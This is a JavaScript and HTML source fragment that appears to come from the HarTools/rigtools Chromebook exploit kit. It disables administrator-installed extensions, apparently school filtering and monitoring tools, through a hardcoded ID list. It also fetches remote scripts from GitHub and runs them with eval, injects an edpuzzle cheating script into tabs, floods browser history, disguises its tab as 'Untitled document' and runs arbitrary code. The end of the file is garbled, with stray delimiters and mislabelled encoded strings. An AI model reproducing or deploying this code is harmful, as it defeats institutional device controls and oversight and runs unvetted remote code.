      <input type="checkbox" ${enabled ? "checked" : ""}>
      <span class="slider"></span>
    </label>
  `;
  return li;
}

function updateExtensionStatus(extlist_element) {
    return new Promise(function(resolve, reject) {
        extlist_element.innerHTML = "";
        let cardAll = createExtensionCardAll();
        let cardInputAll = cardAll.querySelector("input");

        cardInputAll.addEventListener("change", (event) => {
            cardInputAll.disabled = true;
            chrome.management.getSelf(function(self) {
                chrome.management.getAll(function(extensions) {
                    if (chrome.runtime.lastError) {
                        alert(
                            "Error loading extensions: " + chrome.runtime.lastError.message
                        );
                        return reject(chrome.runtime.lastError);
                    }

                    const promises = [];
                    for (let i = 0; i < extensions.length; i++) {
                        let extId = extensions[i].id;
                        if (extId !== self.id) {
                            promises.push(
                                chrome.management.setEnabled(extId, event.target.checked)
                            );
                        }
                    }
                    Promise.all(promises)
                        .then(() => {
                            cardInputAll.disabled = false;
                            resolve();
                        })
                        .catch((error) => {
                            alert("Error enabling/disabling extensions: " + error.message);
                            reject(error);
                        });
                });
            });
        });

        extlist_element.appendChild(cardAll);

        chrome.management.getAll(function(extlist) {
            if (chrome.runtime.lastError) {
                alert("Error loading extensions: " + chrome.runtime.lastError.message);
                return reject(chrome.runtime.lastError);
            }

            const ordlist = [];
            extlist.forEach(function(extension) {
                if (extension.id === new URL(new URL(location.href).origin).host) {
                    return;
                }
                ordlist.push(extension);

                const icon =
                    extension.icons?.find((ic) => ic.size === 128) ??
                    extension.icons?.at(-1);

                let card = createExtensionCard(
                    extension.name,
                    extension.id,
                    extension.enabled,
                    icon?.url ||
                    "https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/refs/heads/main/images/XOsX.gif"
                );

                let cardInput = card.querySelector("input");

                cardInput.addEventListener("change", (event) => {
                    chrome.management.setEnabled(
                        extension.id,
                        event.target.checked,
                        (result) => {
                            if (chrome.runtime.lastError) {
                                alert(
                                    "Error updating extension status: " +
                                    chrome.runtime.lastError.message
                                );
                            }
                        }
                    );
                });

                card.querySelector(".extension-icon").addEventListener("click", () => {
                    userdefIds = JSON.parse(localStorage.getItem("userdefIds"));
                    if (userdefIds.includes(extension.id)) {
                        userdefIds.remove(extension.id);
                        localStorage.setItem("userdefIds", JSON.stringify(userdefIds));
                        makeToast("removed " + extension.shortName + " from the list", 2);
                    } else {
                        userdefIds.push(extension.id);
                        localStorage.setItem("userdefIds", JSON.stringify(userdefIds));
                        makeToast("added " + extension.shortName + " to the list", 2);
                    }

                    if (localStorage.getItem("userdefIds") === JSON.stringify([])) {
                        document
                            .querySelector("#disable-userdef-exts")
                            .setAttribute("style", "display: none;");
                    } else {
                        document
                            .querySelector("#disable-userdef-exts")
                            .setAttribute("style", "display: inline;");
                    }
                });

                extlist_element.appendChild(card);
            });
            savedExtList = ordlist;
            resolve();
        });
    });
}

const fileManagerPrivateTemplate = `
  <div id="fileManagerPrivate_cap">
    <div id="FMP_openURL">
      <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
    </div>
  </div>

`;
const htmlStyle = `
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap');

* {
  font-family: 'Roboto', Arial, sans-serif;
}

body {
  background-color: #1e1f22;
  color: #fff;
  margin: 0;
  padding: 20px;
}

body::-webkit-scrollbar,
dialog::-webkit-scrollbar,
dialog div::-webkit-scrollbar {
  display: none;
}

p {
  margin: 5px auto;
  color: white;
}

#chrome_management_disable_ext, #ext_default {
  max-width: 1200px;
  margin: 0 auto;
}

h1 {
  font-size: 24px;
  margin-bottom: 20px;
}

.description {
  margin-bottom: 20px;
}

ul {
  list-style-type: none;
  padding: 0;
  margin: 0;
  padding-bottom: 50px;
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
}

.extension-card, .extension-card-all {
  margin-left: 5px;
  margin-bottom: 6px;
  background: #292a2d;
  border-radius: 10px;
  width: 375px;
  height: 140px;
  padding: 10px;
  display: flex;
  flex-direction: column;
  gap: 10px;
  padding: 10px;
  position: relative;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
}

.extension-header {
  display: flex;
  align-items: center;
  margin-bottom: 25px;
  margin-top: 10px;
}

.extension-icon {
  width: 32px;
  height: 32px;
  flex-shrink: 0;
  user-select: none;
  margin-left: 10px;
  margin-right: 10px;
}

.extension-name {
  font-size: 13px;
  color: white;
}

.extension-id {
  font-size: 13px;
  color: #c4c7c5;
  margin-left: 10px;
}

.switch {
    position: absolute;
    display: inline-block;
    width: 28px;
    height: 16px;
    right: 20px;
    bottom: 15px;
}

.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #444746;
  border-radius: 15px;
  border: 1.5px solid #8e918f;
  transition: background-color 0.1s ease-in-out, border-color 0.1s ease-in-out;
}

.slider:before {
  content: "";
  position: absolute;
  height: 12px;
  width: 12px;
  left: 2px;
  top: 50%;
  transform: translateY(-50%) scale(0.8);
  background-color: #8e918f;
  border-radius: 50%;
  transition: transform 0.1s ease-in-out, background-color 0.1s ease-in-out;
}

.switch:hover .slider:before {
  box-shadow: 0 0 6px rgba(255, 255, 255, 0.5);
}

input:checked + .slider {
  background-color: #a8c7fa;
  border-color: #a8c7fa;
}

input:checked + .slider:before {
  transform: translate(10px, -50%) scale(1);
  background-color: #062e6f;
}

.header {
  display: flex;
  align-items: center;
  justify-content: center;
}

.logo {
  width: 4em;
  height: auto;
  margin-right: 10px;
}

.tablist-item {
  border: 1px solid #333;
  margin-bottom: 10px;
  background-color: #000;
  padding: 15px;
  border-radius: 8px;
  display: flex;
  font-weight: bold;
  align-items: center;
}

.tablist-item img {
  max-width: 25px;
  margin-right: 10px;
}

.tablist-item span {
  padding: 10px 0;
  text-overflow: ellipsis;
  width: 100%;
  white-space: nowrap;
  overflow: hidden;
  word-break: break-all;
}

.tablist-item span:hover {
  overflow: visible;
  white-space: normal;
  height: auto;
}

button {
    background: transparent;
    color: #9dbae9;
    font-weight: bold;
    border: 1px solid #047db7;
    border-radius: 20px;
    height: 35px;
    padding: 7px 10px;
    cursor: pointer;
    align-self: flex-end;
    transition: background 0.2s ease-in-out;
    outline: none;
}

button:hover {
    background: #38393b;
}

input {
  padding: 8px 16px;
  margin: 4px 2px;
  color: white;
  background-color: #0a0a0a;
  border: 1px solid #333;
}

input:hover {
  background-color: #111;
  border-color: #fff;
}

#toggleable-buttons button {
  position: relative;
  display: inline-flex;
  align-items: center;
  justify-content: flex-start;
  padding: 9px 15px 9px 60px;
  background-color: white;
  color: black;
  border-radius: 6px;
  margin: 4px 2px;
  transition: background-color 0.3s, color 0.3s;
}

#toggleable-buttons button:hover {
  background-color: #e2e2e2;
}

#toggleable-buttons button::before {
  content: '';
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  width: 42px;
  height: 22px;
  background-color: #333;
  border-radius: 12px;
}

#toggleable-buttons button::after {
  content: '';
  position: absolute;
  left: 14px;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  background-color: #fff;
  border-radius: 50%;
}

#toggleable-buttons button[toggled="true"]::before {
  background-color: #000;
}

#toggleable-buttons button[toggled="true"]::after {
  transform: translateY(-50%) translateX(20px);
}

.container {
  display: flex;
  gap: 10px;
}

#code-run {
  background-color: #fff;
  color: black;
  border: none;
  border-radius: 5px;
  padding: 8px 16px;
  font-weight: bold;
  cursor: pointer;
}

#code-run:hover {
  background-color: #e2e2e2;
}

#code {
  background: #000;
  color: white;
  width: 100%;
  min-height: 50px;
  height: 200px;
  resize: both;
  border: 1px solid #4B4B4D;
  border-radius: 5px;
  font-family: monospace, sans-serif;
  padding: 8px;
  box-sizing: border-box;
}

#code:focus {
  border-color: #fff;
}

.toast[popover]:popover-open {
  opacity: 1;
  top: 5px;
  left: 50%;
}

@starting-style {
  .toast[popover]:popover-open {
    opacity: 0;
    transform: translateY(-100%);
  }
}

.toast[popover] {
  position: fixed;
  inset: unset;
  padding: 5px 10px;
  border-radius: 5px;
  opacity: 0;
  font-weight: bold;
  background: #0a0a0a;
  color: white;
  border: 1px solid #444;
}

dialog {
  opacity: 0;
  padding: 30px;
  border: 1px solid #2d2d2d;
  background: #000;
  background-image: radial-gradient(#333 1px, transparent 1px);
  background-size: 2rem 2rem;
  border-radius: 10px;
  transition: all 0.5s;
  min-width: 50vw;
  min-height: 60vh;
  max-width: 50vw;
  max-height: 60vh;
  display: flex;
  flex-direction: column;
}

dialog[open] {
  opacity: 1;
  transform: scale(1);
}

dialog::backdrop {
  background: rgba(0, 0, 0, 0.25);
  backdrop-filter: blur(3px);
}

dialog div {
  background-color: #000;
  font-family: 'Geist', sans-serif;
}

dialog p {
  margin-bottom: 9px;
  padding: 9px;
  border: 1px solid #27272a;
  font-weight: 700;
}

dialog h1 {
  font-size: 1.5rem;
  color: white;
  font-weight: 900;
}

whitebuttons button {
  background-color: transparent;
  border: 1px solid rgb(4, 125, 183);
  color: rgb(168, 199, 250);
}

whitebuttons button:hover {
  background-color: rgba(168, 199, 250, 0.1);
}

litstuff {
  color: #444;
  font-family: monospace, sans-serif;
  font-size: 12px;
  font-style: italic;
  margin-left: 6px;
}
    </style>
  `;

onload = async function x() {
    let foundNothing = true;
    document.open();
    this.document.write(htmlStyle);
    document.close();

    if (chrome.fileManagerPrivate) {
        chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
        document.write(fileManagerPrivateTemplate);
        document.body.querySelector("#btn_FMP_openURL").onclick = function(ev) {};
    }

    if (chrome.management.setEnabled) {
        document.body.insertAdjacentHTML("beforeend", managementTemplate);
        const extlist_element = document.querySelector(".extlist");

        await updateExtensionStatus(extlist_element);
        const container_extensions = document.body.querySelector(
            "#chrome_management_disable_ext"
        );

        container_extensions.querySelector("#current-extension").onclick =
            async function df(e) {
                try {
                    const grabidtokill = chrome.runtime.id;
                    chrome.management.setEnabled(grabidtokill, false);
                } catch {
                    alert("unsuccessful");
                }
            };

        container_extensions.querySelector("#rmv-cmn-blt").onclick = function df() {
            const bloatIds = [
                "cgbbbjmgdpnifijconhamggjehlamcif",
                "lfkbbmclnpaihpaajhohhfdjelchkikf",
                "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
                "pohmgobdeajemcifpoldnnhffjnnkhgf",
                "becdplfalooflanipjoblcmpaekkbbhe",
                "feepmdlmhplaojabeoecaobfmibooaid",
                "adkcpkpghahmbopkjchobieckeoaoeem",
                "haldlgldplgnggkjaafhelgiaglafanh",
                "filgpjkdmjinmjbepbpmnfobmjmgimon",
                "kkbmdgjggcdajckdlbngdjonpchpaiea",
                "njdniclgegijdcdliklgieicanpmcngj",
                "hpkdokakjglppeekfeekmebfahadnflp",
            ];

            let exts = {};
            let extlngth = 0;

            function getLength() {
                return new Promise((resolve) => {
                    bloatIds.forEach((id, i) => {
                        extensionExists(id).then((res) => {
                            if (res) extlngth++;
                            if (bloatIds.length - 1 === i) resolve();
                        });
                    });
                });
            }

            function initExtObj() {
                return new Promise((resolve) => {
                    bloatIds.forEach((id) =>
                        chrome.management.get(id, (e) => {
                            Object.assign(exts, JSON.parse(`{"${e.id}":"${e.shortName}"}`));
                            if (Object.keys(exts).length == extlngth) resolve();
                        })
                    );
                });
            }

            getLength().then(() =>
                initExtObj().then(() =>
                    makeDialog(
                        "Are you sure you want to disable the following extensions?",
                        Object.values(exts),
                        function() {},
                        function() {
                            let disabledExts = [];
                            Object.keys(exts).forEach((id) => {
                                chrome.management.get(id, (e) => {
                                    if (e.enabled) {
                                        if (id == chrome.runtime.id) return;

                                        disabledExts.push(e.shortName);
                                        chrome.management.setEnabled(id, false);
                                    }
                                });
                            });

                            setTimeout(() => {
                                if (!disabledExts.length < 1) {
                                    makeToast(
                                        "disabled the following extensions:\r\n" +
                                        disabledExts.join("\r\n"),
                                        disabledExts.length
                                    );
                                    updateExtensionStatus(extlist_element);
                                }
                            }, 250);
                        }
                    )
                )
            );
        };

        if (localStorage.getItem("userdefIds") == JSON.stringify([])) {
            container_extensions
                .querySelector("#disable-userdef-exts")
                .setAttribute("style", "display: none;");
        }

        container_extensions.querySelector("#disable-userdef-exts").onclick =
            function df(e) {
                let exts = {};

                function initExtObj() {
                    let idlist = JSON.parse(localStorage.getItem("userdefIds"));
                    return new Promise((resolve) => {
                        idlist.forEach((id) => {
                            chrome.management.get(id, (e) => {
                                Object.assign(exts, JSON.parse(`{"${e.id}":"${e.shortName}"}`));
                                if (Object.keys(exts).length == idlist.length) resolve();
                            });
                        });
                    });
                }

                initExtObj().then(() => {
                    makeDialog(
                        "Are you sure you want to disable the following extensions?",
                        Object.values(exts),
                        function() {},
                        function() {
                            let disabledExts = [];
                            JSON.parse(localStorage.getItem("userdefIds")).forEach((id) => {
                                chrome.management.get(id, (e) => {
                                    if (e.enabled) {
                                        if (id == chrome.runtime.id) return;

                                        disabledExts.push(e.shortName);
                                        chrome.management.setEnabled(id, false);
                                    }
                                });
                            });

                            setTimeout(() => {
                                if (!disabledExts.length < 1) {
                                    makeToast(
                                        "disabled the following extensions:\r\n" +
                                        disabledExts.join("\r\n"),
                                        disabledExts.length
                                    );
                                    updateExtensionStatus(extlist_element);
                                }
                            }, 250);
                        }
                    );
                });
            };
    }
    const otherFeatures = window.chrome.runtime.getManifest();
    const permissions = otherFeatures.permissions;

    new DefaultExtensionCapabilities().activate();
    document.body.insertAdjacentHTML(
        "beforeend",
        `
      <title>Untitled document</title>
      <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/">
      `
    );

    const ScriptButtons = document.querySelector("#other-buttons");

    ScriptButtons.querySelector("#swamp").onclick = async function df(e) {
        fetch(
                "https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/scripts/swamp-ultra.js"
            )
            .then((res) => res.text())
            .then(eval);
    };

    ScriptButtons.querySelector("#update").onclick = async function df(e) {
        (async () => {
            const fs = await new Promise(function(resolve) {
                webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
            });

            function writeFile(file, data) {
                return new Promise((resolve, reject) => {
                    fs.root.getFile(file, {
                        create: true
                    }, function(entry) {
                        entry.remove(function() {
                            fs.root.getFile(file, {
                                create: true
                            }, function(entry) {
                                entry.createWriter(function(writer) {
                                    writer.write(new Blob([data]));
                                    writer.onwriteend = resolve.bind(null, entry.toURL());
                                });
                            });
                        });
                    });
                });
            }

            const url = await writeFile(
                "hartools.html",
                `${await fetch(
          "https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/payloads/index.html"
        ).then((res) => res.text())}<script src="./hartools.js"></script>`
            );

            await writeFile(
                "hartools.js",
                await fetch(
                    "https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/payloads/index.js"
                ).then((res) => res.text())
            );

            chrome.tabs.create({
                url
            });
        })();
    };
    ScriptButtons.querySelector("#quick-rmv-blt").onclick = async function df(e) {
        (async () => {

            const fs = await new Promise(function (resolve) {
                  webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
                });
            
            function writeFile(file, data) {
                  return new Promise((resolve, reject) => {
                    fs.root.getFile(file, { create: true }, function (entry) {
                      entry.remove(function () {
                        fs.root.getFile(file, { create: true }, function (entry) {
                          entry.createWriter(function (writer) {
                            writer.write(new Blob([data]));
            
                            writer.onwriteend = resolve.bind(null, entry.toURL());
                          });
                        });
                      });
                    });
                  });
                }
            
            const JS = `try {
                    const bloatIds = [
                      "cgbbbjmgdpnifijconhamggjehlamcif",
                      "lfkbbmclnpaihpaajhohhfdjelchkikf",
                      "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
                      "pohmgobdeajemcifpoldnnhffjnnkhgf",
                      "becdplfalooflanipjoblcmpaekkbbhe",
                      "feepmdlmhplaojabeoecaobfmibooaid",
                      "adkcpkpghahmbopkjchobieckeoaoeem",
                      "haldlgldplgnggkjaafhelgiaglafanh",
                      "filgpjkdmjinmjbepbpmnfobmjmgimon",
                      "kkbmdgjggcdajckdlbngdjonpchpaiea",
                      "njdniclgegijdcdliklgieicanpmcngj",
                      "hpkdokakjglppeekfeekmebfahadnflp"
                    ];
            
                    bloatIds.forEach((id) => {
                      if (id == chrome.runtime.id) return;
                        chrome.management.setEnabled(id, false);
                    });
                    window.close();
                  } catch {
                    alert("unsuccessful");
                  }
            `;
            
            const fileName = "bloat";
            
            const url = await writeFile(`${fileName}.html`,`<!doctypehtml><title>disabling..</title><link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"rel=stylesheet><style>p{margin:0}body{background-color:#000;color:#fff;font-family:Inter,sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}h1::before{content:"# ";color:oklch(81.21% .1409 165.14);font-weight:900}.inner{display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}textarea{width:max-content;padding-top:1em;overflow-y:hidden;border-radius:10px;background:oklch(17.03% .0083 285.49 / .5);border:1px solid oklch(68.65% .0374 274.73 / .5);color:oklch(95.92% .019253 273.2377);resize:none;font-family:monospace;transition:all .5s cubic-bezier(.175,.885,.32,1.9),color .25s,border-color .25s}</style><div class=inner><textarea cols=12 readonly rows=2>  (^____^)</textarea><h1>disabling...</h1><p>happy days  without blocking am i right?</div><script src=./${fileName}.js></script>`);
            
            await writeFile(`${fileName}.js`, JS);
            
            chrome.tabs.create({ url });
            
            })();
    };

    ScriptButtons.querySelector("#hstfld").onclick = async function df(e) {
        document.title = "Untitled document";
        let link =
            document.querySelector("link[rel~='icon']") ||
            document.createElement("link");
        link.rel = "icon";
        document.head.appendChild(link);
        link.href =
            "https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/";

        let num = prompt(
            "How Times Do You Want This Page To Show Up In your History?"
        );
        let done = false;
        const x = window.location.href;
        for (let i = 1; i <= num; i++) {
            history.pushState(0, 0, i === num ? x : i.toString());
            if (i === num) done = true;
        }
        if (done) {
            alert(
                "Flooding Successful!\n " +
                window.location.href +
                " \nIs Now In Your History " +
                num +
                (num == 1 ? " time." : " Times.")
            );
        }
    };

    const TabButtons = document.querySelector("#tabs-buttons");

    if (chrome.tabs.executeScript) {

        function listenerApp(callback) {
            const func = (id, changeInfo) => {
                if (changeInfo.status === "complete") {
                    chrome.tabs.get(id, (tab) => {
                        if (tab) {
                            callback(tab);
                        }
                    });
                }
            };
            chrome.tabs.onUpdated.addListener(func);
            return func;
        }

        const scripts = {};
        const conditions = {};
        const listeners = {};

        scripts.eruda = `
    fetch("https://cdn.jsdelivr.net/npm/eruda").then(res => res.text()).then((data) => {
      eval(data);
      if (!window.erudaLoaded) {
        eruda.init({
          defaults: {
            displaySize: 45,
            theme: "AMOLED"
          }
        });
        window.erudaLoaded = true;
      }
    });
  `;

        scripts.chii = `
    const script = document.createElement('script');
    script.src = 'https://chii.liriliri.io/playground/target.js';
    script.setAttribute('embedded', 'true');
    document.head.appendChild(script);
  `;

        scripts.adblock = `
    (function(){

      var selectors = [

      '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',
      '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',
      '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',
      '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',
      'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',

      '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',
      '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',
      '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',
      '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',
      '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',
      'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',
      'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',
      'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',
      'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',
      'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',
      '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',
      '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',
      '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',

      'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',
      'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',
      'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',
      'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];
      for(let i in selectors) {
          let nodesList = document.querySelectorAll(selectors[i]);
          for(let i = 0; i < nodesList.length; i++) {
              let el = nodesList[i];
              if(el && el.parentNode)
              el.parentNode.removeChild(el);
          }
      }
    })();
  `;
  /*scripts.glocked = `
fetch("https://raw.githubusercontent.com/xNasuni/google-forms-unlocker/refs/heads/main/script.js")
  .then(response => {
    if (!response.ok) {
      throw new Error("Network response was not ok");
    }
    return response.text();
  })
  .then(scriptContent => {
    if (!window.skibLoaded) {
      eval(scriptContent);
      window.skibLoaded = true;
    }
  })
  .catch(error => alert("Error loading script:", error));
`;
*/
        scripts.edpuzzle = `
    fetch("https://cdn.jsdelivr.net/gh/Miner49ur/shorthand@main/edpuzzlingscript.js").then(r => r.text()).then(r => {
      if (!window.edpuzzlesLoaded) {
        eval(r);
        window.edpuzzlesLoaded = true;
      }
    });
  `;
        conditions.edpuzzle = (tab) => tab.url.match(/edpuzzle\.com\/assignments/g);
        // conditions.glocked = (tab) => tab.url.match(/https?:\/\/docs\.google\.com\/forms\//g);
        const ToggleButtons = TabButtons.querySelector("#toggleable-buttons");

        ToggleButtons.querySelectorAll("button").forEach(
            (b) =>
            (b.onclick = () => {
                const id = b.id;

                if (b.hasAttribute("toggled")) {

                    if (id in listeners)
                        chrome.tabs.onUpdated.removeListener(listeners[id]);
                    b.removeAttribute("toggled");
                } else {

                    const script = scripts[id] || "";
                    const condition = conditions[id] || ((tab) => true);
                    const func = listenerApp((tab) => {
                        if (condition(tab)) {
                            chrome.tabs.executeScript(tab.id, {
                                code: script
                            });
                        }
                    });

                    listeners[id] = func;

                    b.setAttribute("toggled", "true");
                }
            })
        );
    } else {
        TabButtons.style.display = "none";
    }

    document
        .querySelector("#code-run")
        .addEventListener("click", () => runCode(false));
};

const runCode = async (onTab, tabId = "") => {
    const codeTextarea = document.querySelector("#code");
    let code = codeTextarea.value.trim();

    const outputDiv = document.querySelector("#code-output");

    if (code.toLowerCase() === "prahit") {

        const container = document.createElement("div");
        container.className = "prahit-container";

        const overlayImage = document.createElement("img");
        overlayImage.src =
            "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/prahit.png";
        overlayImage.alt = "Prahit Image";
        overlayImage.className = "prahit-image";

        const textBox = document.createElement("div");
        textBox.textContent = "\"I made my own oil rigging stock market tools.\"";
        textBox.className = "prahit-textbox";

        container.appendChild(overlayImage);
        container.appendChild(textBox);

        document.body.appendChild(container);

        const snowflakesDiv = document.createElement("div");
        snowflakesDiv.className = "snowflakes";
        snowflakesDiv.setAttribute("aria-hidden", "true");

        for (let i = 0; i < 14; i++) {
            const snowflake = document.createElement("div");
            snowflake.className = "snowflake";

            const snowflakeImage = document.createElement("img");
            snowflakeImage.width = 30;
            snowflakeImage.src = "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/prahit.png";
            snowflake.appendChild(snowflakeImage);

            snowflakesDiv.appendChild(snowflake);
        }

        document.body.appendChild(snowflakesDiv);

        const explosionImage = document.createElement("img");
        explosionImage.src = "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/boom.awebp";
        explosionImage.style.position = "fixed";
        explosionImage.style.top = "0";
        explosionImage.style.left = "0";
        explosionImage.style.width = "100%";
        explosionImage.style.height = "100%";
        explosionImage.style.zIndex = "9999";
        explosionImage.style.display = "none";
        document.body.appendChild(explosionImage);

        const explode = new Audio("https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/boom.mp3");

        const catsMusic = new Audio("https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/cats.mp3");
        catsMusic.loop = true;

        function showExplosionAndPlayMusic() {

            explosionImage.style.display = 'block';

            explode.play();
            catsMusic.play();

            setTimeout(function() {
                explosionImage.style.display = 'none';
            }, 1500);

            setTimeout(function() {
                explode.pause();
                explode.currentTime = 0;
            }, 1500);
        }

        showExplosionAndPlayMusic();

        return;
    }

    if (onTab) {
        code = chrome.tabs.executeScript ?
            `;chrome.tabs.executeScript(
          ${tabId},
          { code: ${JSON.stringify(code)} }
        )` :
            chrome.scripting ?
            `chrome.scripting.executeScript({
          target: {tabId: ${tabId}},
          func: () => {${code}}
        });` :
            `alert("something went wrong, runCode was executed on a tab without proper permissions")`;
    }

    try {
        const originalLog = console.log;
        console.log = (...args) => {
            outputDiv.innerHTML += args.join(" ") + "<br>";
        };

        const fs = await DefaultExtensionCapabilities.getFS();

        function writeFile(file, data) {
            return new Promise((resolve, reject) => {
                fs.root.getFile(file, {
                    create: true
                }, function(entry) {
                    entry.remove(function() {
                        fs.root.getFile(file, {
                            create: true
                        }, function(entry) {
                            entry.createWriter(function(writer) {
                                writer.write(new Blob([data]));
                                writer.onwriteend = resolve.bind(null, entry.toURL());
                            });
                        });
                    });
                });
            });
        }

        const url = await writeFile("src.js", code);
        let script =
            document.body.querySelector("#evaluate_elem") ??
            document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);

        console.log = originalLog;
    } catch (error) {
        outputDiv.innerHTML = `Error: ${error}`;
    }
};
=`))\n                    const url = await writeFile('index.html', `${atob('<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Extension Evaluation - HarTools</title>
</head>

<body>
  <div id="particles-js"></div>
  <div class="main">
    <h1>No payloads are available</h1>
    <p>No payloads currently available for your extension. Try another extension.
      We are currently developing payloads for other APIs.</p>
    <p>Available payloads for permissions:</p>
    <ul>
      <li>management</li>
    </ul>
  </div>
  
  <style>
    body {
      background-color: #1e2030;
      color: white;
      font-family: Arial, Helvetica, sans-serif;
      overflow: hidden;
    }

    a {
      color: #b7bdf8;
    }

    .main {
      top: 50%;
      left: 50%;
      position: absolute;
      transform: translate(-50%, -50%);
      border: 3px solid white;
      font-weight: bold;
      padding: 5%;
      border-radius: 10px;
      text-align: center;
      background-color: #24273a;
    }

    .button {
      background-color: #a6da95;
      border: none;
      color: white;
      padding: 10px 20px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 14px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 5px;
    }

    ul {
      text-align: center;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
  </style>
</body>

</html>
')}<script src=\"./index.js\" ></script>`);\n                    w.chrome.tabs.create({ url });\n                    w.close();\n                    cleanup();\n                });\n\n\n                // }, 5000);\n            \n            }\n            document.open();\n            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html\n            document.write(atob(`<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard</title>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Geist:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap');

      body {
        font-family: 'Geist', sans-serif;
        background-color: #202124;
        color: #e8eaed;
        margin: 0;
        padding: 20px;
      }

      .main {
        max-width: 900px;
        margin: 50px auto;
        background-color: #2b2b2b;
        border-radius: 12px;
        padding: 30px;
        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
        border: 1px solid #3c4043;
        transition: box-shadow 0.3s ease, border-color 0.3s ease;
      }

      .main:hover {
  box-shadow: 0 0 10px 2px #8a2be2, 0 0 20px 4px #8a2be2;
  border-color: #8a2be2;
      }

      .header {
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-bottom: 20px;
      }

      .logo {
        width: 3.5em;
        height: auto;
        margin-bottom: 10px;
      }

      h1 {
        font-size: 2.2em;
        margin: 0;
        color: #bb86fc;
      }

      p {
        font-size: 14px;
        line-height: 1.6;
        color: #dadce0;
      }

      a {
        color: #bb86fc;
        text-decoration: underline;
      }

      a:hover {
        text-decoration: none;
      }

      .button {
        background-color: #8a2be2;
        color: white;
        padding: 8px 14px;
        font-size: 14px;
        margin: 6px 4px;
        border: none;
        cursor: pointer;
        border-radius: 6px;
        font-weight: bold;
        transition: all 0.2s ease;
        display: inline-block;
      }

      .button:hover {
        background-color: #a066f5;
        transform: scale(1.05);
      }

      .button:focus {
        outline: none;
      }

      input,
      select,
      textarea {
        background-color: #303134;
        color: #e8eaed;
        border: 1px solid #5f6368;
        padding: 10px;
        border-radius: 4px;
        width: 100%;
        margin-bottom: 15px;
      }

      input:focus,
      select:focus,
      textarea:focus {
        border-color: #bb86fc;
        outline: none;
      }

      ::placeholder {
        color: #9aa0a6;
      }

      hr {
        border: none;
        border-top: 1px solid #3c4043;
        margin: 20px 0;
      }

      .background-grid {
        position: fixed;
        top: 0;
        left: 0;
